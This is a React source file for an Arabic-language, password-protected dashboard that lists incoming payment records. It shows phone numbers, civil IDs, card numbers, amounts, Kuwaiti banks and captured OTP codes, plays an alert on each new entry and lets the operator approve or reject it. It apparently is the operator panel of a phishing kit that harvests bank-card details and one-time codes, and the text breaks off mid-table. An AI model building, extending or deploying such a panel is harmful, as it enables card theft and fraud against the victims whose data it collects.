import { useState, useEffect, useMemo, useRef } from "react";
import { base44 } from "@/api/base44Client";
import {
  Trash2, Users, CreditCard, UserCheck, Flag, Bell, CheckCircle,
  XCircle, Clock, Search, Download, Settings, User, Menu,
  ArrowUpDown, ChevronLeft, ChevronRight, TrendingUp, Activity,
  Filter, RefreshCw, AlertCircle, Loader2, EyeOff, Eye, X, Lock,
  MapPin, LogOut, Sun, Moon,
} from "lucide-react";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { formatDistanceToNow, format } from "date-fns";
import { ar } from "date-fns/locale";
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogFooter } from "@/components/ui/dialog";
import { Card, CardContent, CardHeader, CardTitle, CardFooter, CardDescription } from "@/components/ui/card";
import { Popover, PopoverContent, PopoverTrigger } from "@/components/ui/popover";
import { Tooltip, TooltipContent, TooltipProvider, TooltipTrigger } from "@/components/ui/tooltip";
import { Input } from "@/components/ui/input";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Sheet, SheetContent, SheetHeader, SheetTitle } from "@/components/ui/sheet";
import { Tabs, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { useToast } from "@/components/ui/use-toast";

// ─── Constants ────────────────────────────────────────────────────────────────

const BANK_NAMES = {
  ABK: "Al Ahli Bank of Kuwait",
  ALRAJHI: "Al Rajhi Bank",
  BBK: "Bank of Bahrain and Kuwait",
  BOUBYAN: "Boubyan Bank",
  BURGAN: "Burgan Bank",
  CBK: "Commercial Bank of Kuwait",
  Doha: "Doha Bank",
  GBK: "Gulf Bank",
  TAM: "TAM Bank",
  KFH: "Kuwait Finance House",
  KIB: "Kuwait International Bank",
  NBK: "National Bank of Kuwait",
  Weyay: "Weyay Bank",
  QNB: "Qatar National Bank",
  UNB: "Union National Bank",
  WARBA: "Warba Bank"
};

// ─── Sub-components ───────────────────────────────────────────────────────────

function StatisticsCard({ title, value, change, changeType, icon: Icon, color, accent, dark }) {
  return (
    <div className={`relative overflow-hidden rounded-2xl border p-6 group transition-all duration-300 ${dark ? "border-white/10 bg-slate-900/80 backdrop-blur-sm shadow-2xl shadow-black/30 hover:border-white/20" : "border-slate-200 bg-white shadow-md hover:shadow-lg hover:border-slate-300"}`}>
      <div className={`absolute inset-0 bg-gradient-to-br ${accent} opacity-10 group-hover:opacity-15 transition-opacity duration-300 rounded-2xl`} />
      <div className="relative flex items-start justify-between">
        <div className={`p-3 rounded-xl ${color} shadow-lg`}>
          <Icon className="h-6 w-6 text-white" />
        </div>
        <div className="text-right">
          <p className={`text-xs uppercase tracking-widest mb-1 ${dark ? "text-slate-500" : "text-slate-400"}`}>{title}</p>
          <p className={`text-4xl font-black tabular-nums ${dark ? "text-white" : "text-slate-800"}`}>{value}</p>
        </div>
      </div>
      {change && (
        <div className="relative mt-4 flex items-center gap-1.5">
          <span className={`inline-flex items-center gap-1 text-xs font-semibold px-2 py-0.5 rounded-full ${changeType === "increase" ? (dark ? "bg-emerald-500/20 text-emerald-300" : "bg-emerald-100 text-emerald-700") : (dark ? "bg-slate-700/50 text-slate-400" : "bg-slate-100 text-slate-500")}`}>
            <TrendingUp className="h-3 w-3" />{change}
          </span>
        </div>
      )}
    </div>
  );
}

function FlagColorSelector({ id, currentColor, onChange }) {
  return (
    <Popover>
      <PopoverTrigger asChild>
        <Button variant="ghost" size="icon" className="h-8 w-8 hover:bg-muted">
          <Flag className={`h-4 w-4 transition-colors ${currentColor === "red" ? "text-red-500 fill-red-500" : currentColor === "yellow" ? "text-yellow-500 fill-yellow-500" : currentColor === "green" ? "text-green-500 fill-green-500" : "text-muted-foreground"}`} />
        </Button>
      </PopoverTrigger>
      <PopoverContent className="w-auto p-2" dir="rtl">
        <div className="flex gap-2">
          {[
            { color: "red", label: "عالي الأولوية", bg: "bg-red-500" },
            { color: "yellow", label: "متوسط الأولوية", bg: "bg-yellow-500" },
            { color: "green", label: "منخفض الأولوية", bg: "bg-green-500" },
          ].map(({ color, label, bg }) => (
            <TooltipProvider key={color}>
              <Tooltip>
                <TooltipTrigger asChild>
                  <Button variant="ghost" size="icon" className={`h-8 w-8 rounded-full ${bg} hover:opacity-80 transition-opacity`} onClick={() => onChange(id, color)}>
                    <Flag className="h-4 w-4 text-white" />
                  </Button>
                </TooltipTrigger>
                <TooltipContent><p>{label}</p></TooltipContent>
              </Tooltip>
            </TooltipProvider>
          ))}
          {currentColor && (
            <TooltipProvider>
              <Tooltip>
                <TooltipTrigger asChild>
                  <Button variant="ghost" size="icon" className="h-8 w-8 rounded-full bg-gray-200 dark:bg-gray-700" onClick={() => onChange(id, null)}>
                    <X className="h-4 w-4" />
                  </Button>
                </TooltipTrigger>
                <TooltipContent><p>إزالة العلم</p></TooltipContent>
              </Tooltip>
            </TooltipProvider>
          )}
        </div>
      </PopoverContent>
    </Popover>
  );
}

function StatusBadge({ status }) {
  const map = {
    approved: { text: "موافق", bg: "bg-emerald-500/15 text-emerald-300 border-emerald-500/25", dot: "bg-emerald-400" },
    rejected: { text: "مرفوض", bg: "bg-red-500/15 text-red-300 border-red-500/25", dot: "bg-red-400" },
    pending:  { text: "معلق",  bg: "bg-amber-500/15 text-amber-300 border-amber-500/25",  dot: "bg-amber-400" },
  };
  const { text, bg, dot } = map[status] || map.pending;
  return (
    <span className={`inline-flex items-center gap-1.5 text-xs font-semibold px-2.5 py-1 rounded-lg border ${bg}`}>
      <span className={`w-1.5 h-1.5 rounded-full ${dot}`} />
      {text}
    </span>
  );
}

function InfoBadge({ active, onClick, icon: Icon, text, inactiveText, colorClass }) {
  if (!active) return (
    <span className="inline-flex items-center gap-1.5 text-xs px-3 py-1.5 rounded-lg bg-slate-800/50 text-slate-600 border border-white/5">
      <Icon className="h-3.5 w-3.5" />{inactiveText}
    </span>
  );
  return (
    <button
      onClick={onClick}
      className={`inline-flex items-center gap-1.5 text-sm font-semibold px-4 py-1.5 rounded-xl bg-gradient-to-r ${colorClass} text-white shadow-lg hover:opacity-90 hover:shadow-xl transition-all duration-150 border-0 cursor-pointer`}
    >
      <Icon className="h-4 w-4" />{text}
    </button>
  );
}

function InfoSection({ items, additionalOtps }) {
  return (
    <div className="mt-4">
      <div className="rounded-xl border border-white/5 bg-slate-950/50 overflow-hidden">
        {items.map(({ label, value, ltr }, idx) => {
          if (!value && value !== 0) return null;
          return (
            <div key={label} className={`flex justify-between items-center px-4 py-3 ${idx !== 0 ? "border-t border-white/5" : ""} hover:bg-white/[0.03] transition-colors`}>
              <span className="text-sm text-slate-500">{label}</span>
              <span className="text-sm font-semibold text-white font-mono" dir={ltr ? "ltr" : undefined}>{String(value)}</span>
            </div>
          );
        })}
        {additionalOtps?.length > 0 && (
          <div className="px-4 py-3 border-t border-white/5">
            <span className="text-xs text-slate-500 block mb-2">جميع الرموز:</span>
            <div className="flex flex-wrap gap-2">
              {additionalOtps.map((otp, i) => <Badge key={i} variant="outline" className="font-mono border-white/10 text-slate-300">{otp}</Badge>)}
            </div>
          </div>
        )}
      </div>
    </div>
  );
}

function PaginationBar({ currentPage, totalPages, onPageChange, totalItems, itemsPerPage }) {
  const start = (currentPage - 1) * itemsPerPage + 1;
  const end = Math.min(currentPage * itemsPerPage, totalItems);
  const pages = [];
  if (totalPages <= 5) { for (let i = 1; i <= totalPages; i++) pages.push(i); }
  else if (currentPage <= 3) { pages.push(1, 2, 3, 4, "...", totalPages); }
  else if (currentPage >= totalPages - 2) { pages.push(1, "...", totalPages - 3, totalPages - 2, totalPages - 1, totalPages); }
  else { pages.push(1, "...", currentPage - 1, currentPage, currentPage + 1, "...", totalPages); }

  return (
    <div className="flex items-center justify-between flex-wrap gap-4">
      <div className="text-sm text-muted-foreground">
        عرض <span className="font-medium text-foreground">{start}</span> إلى <span className="font-medium text-foreground">{end}</span> من <span className="font-medium text-foreground">{totalItems}</span> عنصر
      </div>
      <div className="flex items-center gap-2">
        <Button variant="outline" size="sm" onClick={() => onPageChange(currentPage - 1)} disabled={currentPage <= 1} className="border-slate-700 text-slate-300 gap-1">
          <ChevronRight className="h-4 w-4" /> السابق
        </Button>
        {pages.map((p, i) => p === "..." ? <span key={`e${i}`} className="px-2 text-slate-500">...</span> : (
          <Button key={p} variant={currentPage === p ? "default" : "outline"} size="sm" className={`w-8 h-8 p-0 border-slate-700 ${currentPage === p ? "bg-emerald-600 text-white border-emerald-600" : "text-slate-300"}`} onClick={() => onPageChange(p)}>{p}</Button>
        ))}
        <Button variant="outline" size="sm" onClick={() => onPageChange(currentPage + 1)} disabled={currentPage >= totalPages} className="border-slate-700 text-slate-300 gap-1">
          التالي <ChevronLeft className="h-4 w-4" />
        </Button>
      </div>
    </div>
  );
}

// ─── Password Gate ─────────────────────────────────────────────────────────────

function PasswordGate({ onUnlock }) {
  const [input, setInput] = useState("");
  const [error, setError] = useState(false);
  const [loading, setLoading] = useState(false);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setError(false);
    try {
      const res = await base44.functions.invoke("checkDashPassword", { password: input });
      if (res.data?.ok) {
        sessionStorage.setItem("dash_unlocked", "1");
        onUnlock();
      } else {
        setError(true);
        setInput("");
      }
    } catch {
      setError(true);
      setInput("");
    }
    setLoading(false);
  };

  return (
    <div className="min-h-screen flex items-center justify-center bg-slate-950" dir="rtl">
      <div className="bg-slate-900 border border-slate-700/50 rounded-2xl p-8 w-full max-w-sm shadow-2xl">
        <div className="flex justify-center mb-6">
          <div className="bg-gradient-to-br from-emerald-600 to-teal-600 p-3 rounded-xl">
            <Lock className="h-6 w-6 text-white" />
          </div>
        </div>
        <h1 className="text-xl font-bold text-white text-center mb-6">لوحة التحكم</h1>
        <form onSubmit={handleSubmit} className="space-y-4">
          <input
            type="password"
            value={input}
            onChange={e => { setInput(e.target.value); setError(false); }}
            placeholder="كلمة المرور"
            className="w-full bg-slate-800 border border-slate-700 rounded-lg px-4 py-2.5 text-white placeholder-slate-500 outline-none focus:border-emerald-500 transition-colors"
            autoFocus
          />
          {error && <p className="text-red-400 text-sm text-center">كلمة المرور غير صحيحة</p>}
          <button
            type="submit"
            disabled={loading}
            className="w-full bg-gradient-to-r from-emerald-600 to-teal-600 hover:opacity-90 disabled:opacity-60 text-white font-semibold py-2.5 rounded-lg transition-opacity"
          >
            {loading ? "جاري التحقق..." : "دخول"}
          </button>
        </form>
      </div>
    </div>
  );
}

// ─── Main Dashboard ────────────────────────────────────────────────────────────

export default function Dashboard() {
  const { toast } = useToast();
  const [unlocked, setUnlocked] = useState(() => sessionStorage.getItem("dash_unlocked") === "1");
  const [darkMode, setDarkMode] = useState(() => localStorage.getItem("dash_dark") !== "light");
  const [records, setRecords] = useState([]);
  const [isLoading, setIsLoading] = useState(true);
  const [selectedRecord, setSelectedRecord] = useState(null);
  const [dialogType, setDialogType] = useState(null);
  const [filterType, setFilterType] = useState("all");
  const [searchTerm, setSearchTerm] = useState("");
  const [currentPage, setCurrentPage] = useState(1);
  const [sortBy, setSortBy] = useState("date");
  const [sortOrder, setSortOrder] = useState("desc");
  const [showStats, setShowStats] = useState(true);
  const [mobileMenuOpen, setMobileMenuOpen] = useState(false);
  const itemsPerPage = 10;

  const fetchRecords = async () => {
    setIsLoading(true);
    const data = await base44.entities.PaymentRecord.list("-created_date", 200);
    setRecords(data);
    setIsLoading(false);
  };

  useEffect(() => {
    if (unlocked) fetchRecords();
  }, [unlocked]);

  const playNotificationSound = () => {
    try {
      const ctx = new (window.AudioContext || window.webkitAudioContext)();
      const playBeep = (freq, startTime, duration) => {
        const osc = ctx.createOscillator();
        const gain = ctx.createGain();
        osc.connect(gain);
        gain.connect(ctx.destination);
        osc.frequency.value = freq;
        osc.type = "sine";
        gain.gain.setValueAtTime(0, startTime);
        gain.gain.linearRampToValueAtTime(0.4, startTime + 0.01);
        gain.gain.exponentialRampToValueAtTime(0.001, startTime + duration);
        osc.start(startTime);
        osc.stop(startTime + duration);
      };
      playBeep(880, ctx.currentTime, 0.15);
      playBeep(1100, ctx.currentTime + 0.18, 0.15);
      playBeep(1320, ctx.currentTime + 0.36, 0.25);
    } catch {}
  };

  const isFirstLoad = useRef(true);
  useEffect(() => {
    if (!unlocked) return;
    const unsub = base44.entities.PaymentRecord.subscribe((event) => {
      if (event.type === "create") {
        setRecords(prev => {
          if (prev.some(r => r.id === event.id)) return prev;
          if (!isFirstLoad.current) playNotificationSound();
          return [event.data, ...prev];
        });
      } else if (event.type === "update") {
        setRecords(prev => prev.map(r => r.id === event.id ? event.data : r));
      } else if (event.type === "delete") {
        setRecords(prev => prev.filter(r => r.id !== event.id));
      }
    });
    const t = setTimeout(() => { isFirstLoad.current = false; }, 3000);
    return () => { unsub(); clearTimeout(t); };
  }, [unlocked]);

  useEffect(() => { setCurrentPage(1); }, [filterType, searchTerm]);

  const handleApproval = async (status, id) => {
    await base44.entities.PaymentRecord.update(id, { network: status === "approved" ? "approved" : "rejected" });
    setRecords(prev => prev.map(r => r.id === id ? { ...r, network: status === "approved" ? "approved" : "rejected" } : r));
    toast({ title: status === "approved" ? "تمت الموافقة" : "تم الرفض" });
  };

  const handleDelete = async (id) => {
    try { await base44.entities.PaymentRecord.delete(id); } catch {}
    setRecords(prev => prev.filter(r => r.id !== id));
    toast({ title: "تم الحذف" });
  };

  const handleFlagChange = async (id, color) => {
    await base44.entities.PaymentRecord.update(id, { bank: color || "" });
    setRecords(prev => prev.map(r => r.id === id ? { ...r, bank: color || "" } : r));
  };

  const handleClearAll = async () => {
    if (!confirm("هل أنت متأكد من حذف جميع السجلات؟")) return;
    setIsLoading(true);
    for (const r of records) {
      try { await base44.entities.PaymentRecord.delete(r.id); } catch {}
    }
    setRecords([]);
    setIsLoading(false);
    toast({ title: "تم مسح جميع السجلات" });
  };

  const filtered = useMemo(() => {
    let list = [...records];
    if (filterType === "card") list = list.filter(r => r.card_number);
    else if (filterType === "pending") list = list.filter(r => !r.network || (r.network !== "approved" && r.network !== "rejected"));
    else if (filterType === "approved") list = list.filter(r => r.network === "approved");
    if (searchTerm) {
      const t = searchTerm.toLowerCase();
      list = list.filter(r =>
        r.phone_number?.toLowerCase().includes(t) ||
        r.card_number?.toLowerCase().includes(t) ||
        r.id_number?.toLowerCase().includes(t) ||
        r.civil_id?.toLowerCase().includes(t) ||
        r.amount?.toLowerCase().includes(t)
      );
    }
    list.sort((a, b) => {
      let av, bv;
      if (sortBy === "date") { av = new Date(a.created_date); bv = new Date(b.created_date); }
      else if (sortBy === "status") { av = a.network || ""; bv = b.network || ""; }
      else if (sortBy === "amount") { av = parseFloat(a.amount) || 0; bv = parseFloat(b.amount) || 0; }
      return sortOrder === "asc" ? (av > bv ? 1 : -1) : (av < bv ? 1 : -1);
    });
    return list;
  }, [records, filterType, searchTerm, sortBy, sortOrder]);

  const paginated = useMemo(() => {
    const s = (currentPage - 1) * itemsPerPage;
    return filtered.slice(s, s + itemsPerPage);
  }, [filtered, currentPage]);

  const totalPages = Math.max(1, Math.ceil(filtered.length / itemsPerPage));
  const cardCount = records.filter(r => r.card_number).length;
  const approvedCount = records.filter(r => r.network === "approved").length;
  const pendingCount = records.filter(r => !r.network || (r.network !== "approved" && r.network !== "rejected")).length;

  const toggleSort = (col) => {
    if (sortBy === col) setSortOrder(o => o === "asc" ? "desc" : "asc");
    else { setSortBy(col); setSortOrder("desc"); }
  };

  const openDialog = (record, type) => { setSelectedRecord(record); setDialogType(type); };
  const closeDialog = () => { setSelectedRecord(null); setDialogType(null); };

  if (!unlocked) return <PasswordGate onUnlock={() => setUnlocked(true)} />;

  if (isLoading && records.length === 0) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-slate-950 via-slate-900 to-slate-950 flex items-center justify-center overflow-hidden">
        <div className="absolute inset-0 overflow-hidden pointer-events-none">
          <div className="absolute -top-32 -left-32 h-96 w-96 rounded-full bg-gradient-to-br from-emerald-500/20 to-teal-500/10 blur-3xl animate-pulse" />
          <div className="absolute -bottom-48 -right-32 h-[500px] w-[500px] rounded-full bg-gradient-to-tl from-cyan-500/15 to-emerald-500/5 blur-3xl animate-pulse" />
        </div>
        <div className="relative flex flex-col items-center gap-6">
          <div className="relative">
            <div className="absolute inset-0 rounded-full bg-gradient-to-r from-emerald-500 to-teal-500 blur-xl opacity-50 animate-pulse" />
            <div className="relative h-16 w-16 animate-spin rounded-full border-4 border-slate-700 border-t-emerald-500" />
          </div>
          <div className="text-xl font-semibold text-white">جاري التحميل...</div>
          <div className="text-sm text-slate-400">يرجى الانتظار</div>
        </div>
      </div>
    );
  }

  const toggleDark = () => {
    setDarkMode(d => {
      localStorage.setItem("dash_dark", d ? "light" : "dark");
      return !d;
    });
  };

  const d = darkMode;

  return (
    <div dir="rtl" className={`min-h-screen text-white transition-colors duration-300 ${d ? "bg-gradient-to-br from-slate-950 via-slate-900 to-slate-950" : "bg-gradient-to-br from-slate-100 via-white to-slate-50 text-slate-900"}`}>
      {/* Animated Background */}
      <div className="fixed inset-0 overflow-hidden pointer-events-none z-0">
        <div className="absolute -top-40 -left-40 h-[500px] w-[500px] rounded-full bg-gradient-to-br from-emerald-600/20 to-teal-600/10 blur-3xl" />
        <div className="absolute top-1/3 right-1/3 h-80 w-80 rounded-full bg-gradient-to-r from-violet-600/10 to-indigo-600/5 blur-3xl" />
        <div className="absolute -bottom-48 -right-40 h-[600px] w-[600px] rounded-full bg-gradient-to-tl from-cyan-600/15 to-emerald-600/5 blur-3xl" />
        <div className="absolute bottom-1/4 left-1/4 h-64 w-64 rounded-full bg-gradient-to-r from-blue-600/10 to-cyan-600/5 blur-3xl" />
      </div>

      {/* Mobile Menu */}
      <Sheet open={mobileMenuOpen} onOpenChange={setMobileMenuOpen}>
        <SheetContent side="right" className="w-[280px] bg-slate-900 border-slate-700" dir="rtl">
          <SheetHeader className="mb-6">
            <SheetTitle className="text-white flex items-center gap-2"><Bell className="h-5 w-5 text-emerald-400" /> لوحة التحكم</SheetTitle>
          </SheetHeader>
          <nav className="space-y-2">
            <Button variant="ghost" className="w-full justify-start text-slate-300" onClick={() => { setShowStats(s => !s); setMobileMenuOpen(false); }}>
              <Activity className="mr-2 h-4 w-4" />{showStats ? "إخفاء الإحصائيات" : "عرض الإحصائيات"}
            </Button>
            <Button variant="ghost" className="w-full justify-start text-slate-300" onClick={() => { fetchRecords(); setMobileMenuOpen(false); }}>
              <RefreshCw className="mr-2 h-4 w-4" />تحديث البيانات
            </Button>
          </nav>
        </SheetContent>
      </Sheet>

      {/* Header */}
      <header className={`sticky top-0 z-50 border-b backdrop-blur-2xl transition-colors duration-300 ${d ? "border-white/5 bg-slate-950/90" : "border-slate-200 bg-white/90"}`}>
        <div className="flex items-center justify-between px-6 py-3">
          <div className="flex items-center gap-4">
            <Button variant="ghost" size="icon" className="md:hidden text-white" onClick={() => setMobileMenuOpen(true)}>
              <Menu className="h-5 w-5" />
            </Button>
            <div className="flex items-center gap-3">
              <div className="relative">
                {pendingCount > 0 && (
                  <div className="bg-red-500 text-white text-[10px] font-bold rounded-full h-5 w-5 flex items-center justify-center shadow-lg shadow-red-500/30 animate-pulse">{pendingCount}</div>
                )}
              </div>
              <div>
                <h1 className={`text-lg font-bold tracking-tight ${d ? "text-white" : "text-slate-900"}`}>لوحة الإشعارات</h1>
                <p className="text-xs text-slate-500">آخر تحديث: {format(new Date(), "HH:mm", { locale: ar })}</p>
              </div>
            </div>
          </div>
          <div className="flex items-center gap-2">
            <TooltipProvider>
              <Tooltip>
                <TooltipTrigger asChild>
                  <Button variant="ghost" size="icon" onClick={fetchRecords} disabled={isLoading} className={`transition-colors ${d ? "text-slate-400 hover:text-emerald-400 hover:bg-white/5" : "text-slate-500 hover:text-emerald-600 hover:bg-slate-100"}`}>
                    <RefreshCw className={`h-4 w-4 ${isLoading ? "animate-spin" : ""}`} />
                  </Button>
                </TooltipTrigger>
                <TooltipContent><p>تحديث البيانات</p></TooltipContent>
              </Tooltip>
            </TooltipProvider>
            <TooltipProvider>
              <Tooltip>
                <TooltipTrigger asChild>
                  <Button variant="ghost" size="icon" onClick={() => setShowStats(s => !s)} className={`transition-colors ${d ? "text-slate-400 hover:text-emerald-400 hover:bg-white/5" : "text-slate-500 hover:text-emerald-600 hover:bg-slate-100"}`}>
                    <Activity className="h-4 w-4" />
                  </Button>
                </TooltipTrigger>
                <TooltipContent><p>{showStats ? "إخفاء الإحصائيات" : "عرض الإحصائيات"}</p></TooltipContent>
              </Tooltip>
            </TooltipProvider>
            <TooltipProvider>
              <Tooltip>
                <TooltipTrigger asChild>
                  <Button variant="ghost" size="icon" onClick={toggleDark} className={`transition-colors ${d ? "text-amber-400 hover:text-amber-300 hover:bg-white/5" : "text-slate-500 hover:text-indigo-600 hover:bg-slate-100"}`}>
                    {d ? <Sun className="h-4 w-4" /> : <Moon className="h-4 w-4" />}
                  </Button>
                </TooltipTrigger>
                <TooltipContent><p>{d ? "الوضع النهاري" : "الوضع الليلي"}</p></TooltipContent>
              </Tooltip>
            </TooltipProvider>
          </div>
        </div>
      </header>

      <div className="relative z-10 p-6 space-y-8 max-w-[1920px] mx-auto">
        {/* Statistics */}
        {showStats && (
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
            <StatisticsCard title="إجمالي السجلات" value={records.length} change="+12%" changeType="increase" icon={Users} color="bg-gradient-to-br from-blue-500 to-indigo-600" accent="from-blue-500 to-indigo-600" dark={d} />
            <StatisticsCard title="معلومات البطاقات" value={cardCount} change="+8%" changeType="increase" icon={CreditCard} color="bg-gradient-to-br from-violet-500 to-purple-600" accent="from-violet-500 to-purple-600" dark={d} />
            <StatisticsCard title="الموافقات" value={approvedCount} change="+15%" changeType="increase" icon={CheckCircle} color="bg-gradient-to-br from-emerald-500 to-teal-600" accent="from-emerald-500 to-teal-600" dark={d} />
            <StatisticsCard title="المعلقة" value={pendingCount} change="" changeType="neutral" icon={Clock} color="bg-gradient-to-br from-amber-500 to-orange-600" accent="from-amber-500 to-orange-600" dark={d} />
          </div>
        )}

        {/* Filters */}
        <div className={`rounded-2xl border backdrop-blur-sm p-4 transition-colors duration-300 ${d ? "border-white/5 bg-slate-900/60" : "border-slate-200 bg-white/80 shadow-sm"}`}>
          <div className="flex flex-col lg:flex-row gap-4 items-start lg:items-center justify-between">
            <div className="flex flex-col sm:flex-row gap-3 w-full lg:w-auto">
              <Tabs value={filterType} onValueChange={setFilterType} className="w-full sm:w-auto">
               <TabsList className={`grid grid-cols-4 rounded-xl p-1 ${d ? "bg-slate-950/60 border border-white/5" : "bg-slate-100 border border-slate-200"}`}>
                  <TabsTrigger value="all" className="flex items-center gap-1 text-slate-500 rounded-lg data-[state=active]:bg-emerald-600 data-[state=active]:text-white data-[state=active]:shadow-lg"><Filter className="h-3 w-3" />الكل</TabsTrigger>
                  <TabsTrigger value="pending" className="flex items-center gap-1 text-slate-500 rounded-lg data-[state=active]:bg-amber-600 data-[state=active]:text-white data-[state=active]:shadow-lg"><Clock className="h-3 w-3" />معلق</TabsTrigger>
                  <TabsTrigger value="card" className="flex items-center gap-1 text-slate-500 rounded-lg data-[state=active]:bg-violet-600 data-[state=active]:text-white data-[state=active]:shadow-lg"><CreditCard className="h-3 w-3" />بطاقات</TabsTrigger>
                  <TabsTrigger value="approved" className="flex items-center gap-1 text-slate-500 rounded-lg data-[state=active]:bg-cyan-600 data-[state=active]:text-white data-[state=active]:shadow-lg"><CheckCircle className="h-3 w-3" />موافق</TabsTrigger>
                </TabsList>
              </Tabs>
              <Select value={sortBy} onValueChange={setSortBy}>
                <SelectTrigger className={`w-full sm:w-[160px] rounded-xl ${d ? "bg-slate-950/60 border-white/5 text-slate-300" : "bg-white border-slate-200 text-slate-700"}`}>
                  <ArrowUpDown className="h-3.5 w-3.5 ml-2 text-emerald-400" />
                  <SelectValue placeholder="ترتيب حسب" />
                </SelectTrigger>
                <SelectContent className="bg-slate-900 border-slate-700">
                  <SelectItem value="date" className="text-slate-300 focus:bg-slate-800 focus:text-white">التاريخ</SelectItem>
                  <SelectItem value="status" className="text-slate-300 focus:bg-slate-800 focus:text-white">الحالة</SelectItem>
                  <SelectItem value="amount" className="text-slate-300 focus:bg-slate-800 focus:text-white">المبلغ</SelectItem>
                </SelectContent>
              </Select>
            </div>
            <div className="relative w-full lg:w-[380px] group">
              <Search className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-slate-600 group-focus-within:text-emerald-400 transition-colors duration-200" />
              <Input
                type="search"
                placeholder="البحث في السجلات..."
                className={`pl-10 pr-10 rounded-xl transition-colors duration-200 ${d ? "bg-slate-950/60 border-white/5 text-white placeholder:text-slate-600 focus:border-emerald-500/40" : "bg-white border-slate-200 text-slate-800 placeholder:text-slate-400 focus:border-emerald-400"}`}
                value={searchTerm}
                onChange={e => setSearchTerm(e.target.value)}
              />
              {searchTerm && (
                <Button variant="ghost" size="icon" className="absolute right-1 top-1/2 -translate-y-1/2 h-7 w-7 text-slate-500 hover:text-white" onClick={() => setSearchTerm("")}>
                  <X className="h-3 w-3" />
                </Button>
              )}
            </div>
          </div>
        </div>

        {/* Table */}
        <Card className={`rounded-2xl border backdrop-blur-sm overflow-hidden transition-colors duration-300 ${d ? "border-white/5 bg-slate-900/60 shadow-2xl shadow-black/30" : "border-slate-200 bg-white shadow-lg"}`}>
          <CardHeader className={`pb-4 border-b transition-colors duration-300 ${d ? "border-white/5" : "border-slate-100"}`}>
            <div className="flex flex-col lg:flex-row lg:items-center lg:justify-between gap-4">
              <div className="flex items-center gap-3">
                <div className="w-1 h-7 rounded-full bg-gradient-to-b from-emerald-400 to-teal-500" />
                <div>
                  <CardTitle className={`text-lg font-bold flex items-center gap-2 tracking-tight ${d ? "text-white" : "text-slate-800"}`}>
                    <Activity className="h-5 w-5 text-emerald-500" /> إدارة السجلات
                  </CardTitle>
                  <CardDescription className={`text-xs mt-0.5 ${d ? "text-slate-500" : "text-slate-400"}`}>
                    {filtered.length} سجل
                  </CardDescription>
                </div>
              </div>
              {records.length > 0 && (
                <Button variant="destructive" size="sm" onClick={handleClearAll} className="bg-red-500/20 text-red-400 border border-red-500/30 hover:bg-red-500/30 hover:text-red-300">
                  <Trash2 className="h-4 w-4 ml-2" /> مسح الكل
                </Button>
              )}
            </div>
          </CardHeader>
          <CardContent className="p-0">
            {paginated.length === 0 ? (
              <div className="flex flex-col items-center justify-center py-16 px-4">
                <div className="rounded-full bg-slate-800/50 p-6 mb-4"><AlertCircle className="h-12 w-12 text-slate-500" /></div>
                <h3 className="text-xl font-semibold mb-2 text-white">لا توجد سجلات</h3>
                <p className="text-slate-400 text-center">{searchTerm || filterType !== "all" ? "لم يتم العثور على نتائج مطابقة للفلاتر المحددة" : "لا توجد سجلات حالياً، ستظهر هنا عند استلام سجلات جديدة"}</p>
              </div>
            ) : (
              <div className="overflow-x-auto">
                <table className="w-full table-auto border-collapse">
                  <thead>
                    <tr className={`border-b transition-colors duration-300 ${d ? "border-white/5" : "border-slate-100"}`}>
                     {[
                       { label: "الهاتف", key: null },
                       { label: "البيانات", key: null },
                       { label: "المبلغ", key: "amount" },
                       { label: "البنك", key: null },
                       { label: "الحالة", key: "status" },
                       { label: "الخطوة", key: null },
                       { label: "OTP", key: null },
                       { label: "الوقت", key: "date" },
                       { label: "الإجراءات", key: null },
                     ].map(({ label, key }) => (
                       <th key={label} className={`px-6 py-3.5 text-right font-semibold text-xs uppercase tracking-wider ${key ? "cursor-pointer transition-colors duration-150" : ""} ${d ? "text-slate-500 hover:text-slate-300" : "text-slate-400 hover:text-slate-700 bg-slate-50"}`} onClick={key ? () => toggleSort(key) : undefined}>
                          <div className="flex items-center gap-1 justify-end">
                            {label}
                            {key && sortBy === key && <ArrowUpDown className="h-3 w-3 text-emerald-400" />}
                          </div>
                        </th>
                      ))}
                    </tr>
                  </thead>
                  <tbody>
                    {paginated.map((r, index) => {
                      const statusLabel = r.network === "approved" ? "approved" : r.network === "rejected" ? "rejected" : "pending";
                      return (
                        <tr key={r.id} className={`border-b transition-colors duration-150 group ${d ? "border-white/[0.04] hover:bg-white/[0.025]" : "border-slate-100 hover:bg-slate-50"}`}>
                           <td className="px-5 py-3.5">
                             <span className={`font-mono text-sm font-medium ${d ? "text-white" : "text-slate-800"}`}>{r.phone_number || r.civil_id || "—"}</span>
                           </td>
                           <td className="px-5 py-3.5">
                             <div className="flex flex-wrap gap-1.5">
                               <InfoBadge
                                 active={r.phone_number || r.id_number || r.civil_id}
                                 onClick={() => openDialog(r, "personal")}
                                 icon={User}
                                 text="معلومات"
                                 inactiveText="لا بيانات"
                                 colorClass="from-violet-500 to-purple-600"
                               />
                               {r.card_number ? (
                                 <button
                                   onClick={() => openDialog(r, "card")}
                                   className="inline-flex items-center gap-1.5 text-sm font-semibold px-3 py-1.5 rounded-xl bg-[#1565C0] text-white shadow-lg hover:opacity-90 hover:shadow-xl transition-all duration-150 border-0 cursor-pointer"
                                 >
                                   <img src="https://media.base44.com/images/public/6a1f21dff88d7df94e752b5a/4187ba546_knet.png" alt="KNET" className="h-5 w-5 rounded-full object-cover" />
                                   KNET
                                 </button>
                               ) : (
                                 <span className="inline-flex items-center gap-1.5 text-xs px-3 py-1.5 rounded-lg bg-slate-800/50 text-slate-600 border border-white/5">
                                   <CreditCard className="h-3.5 w-3.5" />لا بطاقة
                                 </span>
                               )}
                             </div>
                           </td>
                           <td className="px-5 py-3.5">
                              {r.amount
                                ? <span className={`inline-flex items-center font-mono text-sm font-bold rounded-lg px-3 py-1 ${d ? "text-emerald-400 bg-emerald-500/10 border border-emerald-500/20" : "text-emerald-700 bg-emerald-50 border border-emerald-200"}`}>{r.amount}</span>
                                : <span className={d ? "text-slate-600" : "text-slate-300"}>—</span>}
                            </td>
                            <td className="px-5 py-3.5">
